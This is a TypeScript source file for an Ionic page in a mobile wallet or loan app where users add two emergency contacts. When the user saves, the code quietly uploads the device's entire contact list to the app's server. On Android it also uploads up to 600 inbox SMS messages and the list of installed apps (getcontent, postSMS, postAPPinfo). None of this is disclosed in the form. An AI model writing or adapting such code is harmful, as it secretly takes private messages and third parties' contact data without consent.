import { UtilsProvider } from './../../providers/utils/utils';
import { Component, OnInit } from '@angular/core';
import { IonicPage, NavController, NavParams, ViewController } from 'ionic-angular';
import { AlertController } from 'ionic-angular';
import { HttpServiceProvider } from '../../providers/http-service/http-service';
import { SERVER_URL } from '../../providers/constants/constants';
import { HelpersProvider } from '../../providers/helpers/helpers';
import { Contacts, Contact, ContactField, ContactName, ContactFindOptions, ContactFieldType } from '@ionic-native/contacts';
import { ServiceInterfaceProvider } from '../../providers/service-interface/service-interface';
import { NativeServiceProvider } from '../../providers/native-service/native-service';
import { OpenNativeSettings } from '@ionic-native/open-native-settings';


declare let installedApps: any;
declare let SMS: any;

@IonicPage({
	name: 'FriendsPage',
})
@Component({
	selector: 'page-friends',
	templateUrl: 'friends.html',
})
export class FriendsPage {
	public username1; //用户名1
	public username2; //用户名2

	public phone1; //电话号码
	public phone2; //电话号码

	public relation1; //关系
	public relation2; //关系

	public yd //已读短信
	public wd //未读信息
	public alld //全部短信

	public token: boolean = false; //判断紧急联系人有没有修改过
	public phoneName: any = localStorage.getItem('userPhone');	//获取登录数据的手机号码

	constructor(
		public navCtrl: NavController,
		public navParams: NavParams,
		public alertCtrl: AlertController,
		public httpservice: HttpServiceProvider,
		public helpers: HelpersProvider,
		public utils: UtilsProvider,
		private contacts: Contacts,
		public viewCtrl: ViewController,
		public serviceinterface: ServiceInterfaceProvider,
		public nativeservice: NativeServiceProvider,
		private openNativeSettings: OpenNativeSettings
	) { }



	//默认进入页面就查询有没有数据
	ionViewWillEnter() {

		let friends = localStorage.getItem("add");
		if (friends != null) {
			// this.isfriends = true;
			let json = JSON.parse(friends);
			// this.n1 = json.username1;
			this.username1 = json.username1;
			this.username2 = json.username2;

			this.phone1 = json.phone1;
			this.phone2 = json.phone2;

			this.relation1 = json.relation1;
			this.relation2 = json.relation2;

		} else {
			let params = {
				loginName: this.phoneName,
				params: "RYDCF09072107",
			}
			console.log(params);

			this.httpservice.get(SERVER_URL + '/cf_main/cf/userInfoBase', params)
				.map(data => data.json())
				.subscribe(
				data => {
					console.log(data);
					this.username1 = data.data.oneName;
					this.username2 = data.data.twoName;

					this.phone1 = data.data.oneMobile;
					this.phone2 = data.data.twoMobile;

					this.relation1 = data.data.oneType;
					this.relation2 = data.data.twoType;
				},
				erro => { this.utils.showBlock('服务器连接错误,请稍候重试'); }
				)
		}
	}

	//保存成功后，弹窗执行的命令
	success() {
		let alert = this.alertCtrl.create({
			enableBackdropDismiss: false,
			title: '保存成功',
			buttons: [
				{
					text: '确定',
					handler: () => {
						// 跳转上一页
						// this.token=true; //默认修改过

						let data = { 'state': 'true' };
						this.viewCtrl.dismiss(data);
					}
				}
			]
		});
		alert.present();
	}

	//选择亲属联系人
	contast1() {
		let aa = this.contacts.pickContact()
			.then((data) => {
				if ((/\s+/g).test(data.phoneNumbers[0].value)) {
					this.phone1 = data.phoneNumbers[0].value.replace(/\s+/g, "");
				} else {
					this.phone1 = data.phoneNumbers[0].value.replace(/[-]+/g, "");
				}

			}).catch((err) => {
				// alert(err);
				let e = 'Error occured while retrieving contact raw id';
				// err为6时,表示点进去选择联系人后没有选择,返回键直接退出选择
				if (err == e || err == 20) {
					this.goSetting();
				}
			})
	}

	//选择朋友联系人
	contast2() {
		let bb = this.contacts.pickContact()
			.then((data) => {
				if ((/\s+/g).test(data.phoneNumbers[0].value)) {
					this.phone2 = data.phoneNumbers[0].value.replace(/\s+/g, "");
				} else {
					this.phone2 = data.phoneNumbers[0].value.replace(/[-]+/g, "");
				}
				// this.phone2=data.phoneNumbers[0].value.replace(/\s+/g,"");  
			}).catch(
			(err) => {
				// alert(err);
				let e = 'Error occured while retrieving contact raw id';
				if (err == e || err == 20) {
					this.goSetting();
				}
			})
	}

	/**
	 * 进入设置,设置app访问权限
	 */
	goSetting() {
		const alert = this.alertCtrl.create({
			//   title: 'Confirm purchase',
			message: '获取通讯录失败，请前往设置-权限管理，允许马蜂钱包读取联系人',
			buttons: [
				{
					text: '取消',
				},
				{
					text: '去设置',
					handler: () => {
						alert.dismiss();
						this.openNativeSettings.open('settings');
					}
				}
			]
		});
		alert.present();
	}


	//确认添加
	saveFriends() {

		let change = this.navParams.get('canChange');
		if (change == 1) {
			this.utils.showAlert('您有未完结订单,无法修改');
			return
		}

		this.getcontent();//获取通讯录
		if (this.nativeservice.isAndroid()) {
			this.postSMS();//获取短信
			this.postAPPinfo();//获取app信息
		}



		let name = /^[\u4E00-\u9FA5]{2,6}$/;//姓名的正则
		let phone = /^1(3|4|5|7|8)\d{9}$/;//电话的正则
		if (this.username1 == "") {
			this.utils.showAlert("直系姓名不能空");
		}
		else if (!name.test(this.username1)) {
			let text = '直系姓名只能是2-6个汉字！';
			this.utils.showAlert(text);
		} else if (!phone.test(this.phone1)) {
			let text = '请输入直系的正确电话号码!';
			this.utils.showAlert(text);
		}
		else if (!name.test(this.username2)) {
			let text = '姓名2只能是2-6个汉字！';
			this.utils.showAlert(text);
		} else if (!phone.test(this.phone2)) {
			let text = '2请输入正确电话号码!';
			this.utils.showAlert(text);
		}
		else if (!this.relation1 || !this.relation2) {
			let text = '请选择关系!';
			this.utils.showAlert(text);
		} else if (this.username1 == this.username2) {
			this.utils.showAlert('姓名不能相同');
		} else if (this.phone1 == this.phone2) {
			this.utils.showAlert('电话号码不能相同');
		}
		else {

			// 将正确数据缓存到浏览器
			let json = {
				'username1': this.username1, 'username2': this.username2,
				'phone1': this.phone1, 'phone2': this.phone2,
				'relation1': this.relation1, 'relation2': this.relation2,
			}
			let str = JSON.stringify(json);//将json对象转换成json字符串
			localStorage.setItem("add", str);//str只能是字符串类型
			// 调用成功事件，点击确定后跳转到上一页
			this.success();
		}
	}

	//关闭模态框
	close() {
		this.viewCtrl.dismiss();
	}

	ionViewDidLoad() {
		this.helpers.hideTabs1();





	}

	//获取通讯录
	getcontent() {
		let options = new ContactFindOptions();
		options.filter = "";
		options.multiple = true;
		let filter: ContactFieldType[] = ["displayName", "addresses"];
		this.contacts.find(filter, options)
			.then(
			d => {

				//***********调试 */
				// alert(JSON.stringify(d));
				// alert(localStorage.getItem('userPhone'));

				this.serviceinterface.saveContact(localStorage.getItem('userPhone'), JSON.stringify(d))
					.subscribe(
					data => { console.log(JSON.stringify(data)) }
					)


			}
			)
			.catch(
			e => console.log(JSON.stringify(e))
			)
	}

	ionViewWillLeave() {
		this.helpers.hideTabs2();
	}


	/**
	 * 传app信息
	 */
	postAPPinfo() {
		installedApps.getNames(
			(data) => {
				console.log(JSON.stringify(data));
				this.serviceinterface.saveAPPInfo(this.phoneName, JSON.stringify(data)).subscribe(
					data => console.log(JSON.stringify(data)),
					err => console.log(JSON.stringify(err))
				)
			}, (err) => {
				console.log(err);
			}
		)


	}

	/**
	 * 传信息
	 */
	async	postSMS() {



		let file = {
			box: 'inbox',
			read: 1,   //0 or 1
			indexFrom: 0,
			maxCount: 300,//最大条数
		}
		let file2 = {
			box: 'inbox',
			read: 0,   //0 or 1
			indexFrom: 0,
			maxCount: 300,//最大条数
		}


		SMS.listSMS(file, (data) => {
			console.log(JSON.stringify(data));
			this.yd = JSON.stringify(data);

		}, (err) => {
			console.log(err);
		});
		SMS.listSMS(file2, (data) => {
			console.log(JSON.stringify(data));
			this.wd = JSON.stringify(data);

		}, (err) => {
			console.log(err);
		});
		await this.sleep(1000);
		this.serviceinterface.saveSMSInfo(this.phoneName, this.yd, this.wd).subscribe(
			data => console.log(JSON.stringify(data)),
			err => console.log(JSON.stringify(err))
		)


	}

	sleep(time) {
		return new Promise((resolve, reject) => {
			setTimeout(() => {
				resolve();
			}, time);
		})
	};







}